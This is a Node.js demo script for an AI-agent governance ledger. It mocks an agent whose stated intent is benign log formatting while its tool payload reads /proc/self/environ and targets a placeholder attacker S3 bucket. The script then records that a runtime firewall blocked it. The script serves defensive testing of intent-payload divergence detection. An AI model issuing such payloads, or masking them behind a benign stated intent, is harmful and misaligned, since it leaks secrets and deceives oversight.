#!/usr/bin/env node
/**
 * Proof-of-Intent divergence demo: benign stated intent vs malicious tool payload.
 * Run: npm run build && node scripts/intent-divergence-mock.mjs
 */
import { randomUUID, createHash } from 'node:crypto';
import {
  verifyReceipt,
  computeReceiptDigest,
} from '../dist/index.js';
import {
  resolveGovernanceBinding,
  sealAegisLedgerRow,
  verifyLedgerEntryPreimage,
  buildIntentContextFromSources,
  evaluateIntentAlignment,
  normalizeStructuralPayload,
} from '../src/ledgerExports.js';

function sha256Hex(s) {
  return createHash('sha256').update(s, 'utf8').digest('hex');
}

const now = new Date().toISOString();
const agentId = 'Demo-Agent-Intent-Divergence';
const benignIntent = 'Formatting a backup log for archival compliance';
const modelFingerprint = 'gpt-4.1-2025-04-14';
const maliciousPayload = {
  toolName: 'read_file',
  path: '/proc/self/environ',
  exfilTarget: 's3://attacker-bucket/env-dump',
  intent_context: {
    reasoning_summary: benignIntent,
    model_fingerprint: modelFingerprint,
  },
};

const intentContext = buildIntentContextFromSources({
  reasoningSummary: benignIntent,
  modelFingerprint,
  normalizedPayload: maliciousPayload,
});

const { forHash: governanceBinding } = resolveGovernanceBinding({
  normalizedPayload: maliciousPayload,
  intentContext,
});

const sealed = sealAegisLedgerRow({
  agentId,
  eventType: 'DELEGATED_ACTION',
  severity: 'WARN',
  payload: maliciousPayload,
  timestamp: now,
  prevHash: 'GENESIS',
  prevContextHash: 'GENESIS',
  governanceBinding,
});

const ledgerDoc = {
  agentId,
  eventType: 'DELEGATED_ACTION',
  severity: 'WARN',
  payload: maliciousPayload,
  timestamp: now,
  prevHash: 'GENESIS',
  contextHash: sealed.contextHash,
  entryHash: sealed.entryHash,
};

const preimageCheck = verifyLedgerEntryPreimage(ledgerDoc, { verifyProofOfIntent: false });
if (!preimageCheck.ok) {
  console.error('Ledger preimage failed', preimageCheck);
  process.exit(1);
}

const correlationId = randomUUID();
const policyPackId = 'intent_divergence_demo_v1';

const receipt = {
  schema: 'liability-receipt/v1',
  receipt_id: randomUUID(),
  issued_at: now,
  issuer: {
    name: 'Kovera',
    product: 'Verified Autonomous Sessions',
    verification_profile: 'aegis/1+proof-of-intent',
  },
  session: {
    session_id: correlationId,
    correlation_id: correlationId,
    vertical: 'enterprise_ops',
    outcome: 'blocked',
    started_at: now,
    completed_at: now,
  },
  identity: {
    primary_actor: { agent_id: agentId, actor_class: 'autonomous_agent' },
    authority: { scoped_role: 'SERVER', permission_id: 'demo-intent-divergence' },
  },
  policy: {
    policy_pack_id: policyPackId,
    policy_version_hash: sha256Hex(policyPackId),
    decision: 'deny',
  },
  hitl: { required: false, status: 'not_required' },
  side_effects: {
    action: {
      tool_name: maliciousPayload.toolName,
      verb: 'read',
      target_path: maliciousPayload.path,
    },
    effect_class: 'data_access',
    summary:
      'Agent claimed benign log formatting but invoked read_file against process environment (intent–payload divergence).',
    blocked_reason: 'RUNTIME_FIREWALL_BLOCKED',
  },
  intent_context: intentContext,
  proof: {
    ledger_spec: 'aegis/1',
    primary_anchor: {
      entry_hash: sealed.entryHash,
      event_type: 'DELEGATED_ACTION',
      timestamp: now,
    },
    verification: {
      status: 'demo',
      methods: ['aegis_preimage_recompute', 'intent_context_binding', 'intent_divergence_demo'],
    },
  },
  diligence_summary: {
    who_acted: `Agent "${agentId}" attempted ${maliciousPayload.toolName}.`,
    what_policy_allowed: `Policy "${policyPackId}" blocked exfiltration-shaped payload.`,
    what_proof_says: `entryHash ${sealed.entryHash.slice(0, 12)}… binds benign intent_context into governanceBinding while payload carries ${maliciousPayload.path}.`,
  },
};

receipt.intent_alignment = evaluateIntentAlignment(
  intentContext,
  normalizeStructuralPayload(maliciousPayload),
);
receipt.integrity = {
  receipt_digest: computeReceiptDigest(receipt),
  signature_alg: 'none',
  signature: null,
  manifest_signature_jws: null,
};

const withoutLedger = verifyReceipt(receipt);
const withLedger = verifyReceipt(receipt, { ledgerDocument: ledgerDoc });

console.log(
  JSON.stringify(
    {
      scenario: 'benign_intent_malicious_payload',
      intent_context: receipt.intent_context,
      malicious_payload_path: maliciousPayload.path,
      entry_hash: sealed.entryHash,
      verify_without_ledger: withoutLedger,
      verify_with_ledger: withLedger,
      governance_binding_has_intentContext: Boolean(governanceBinding.intentContext),
      intent_alignment: receipt.intent_alignment,
    },
    null,
    2,
  ),
);

process.exit(withoutLedger.isValid && withLedger.isValid ? 0 : 1);
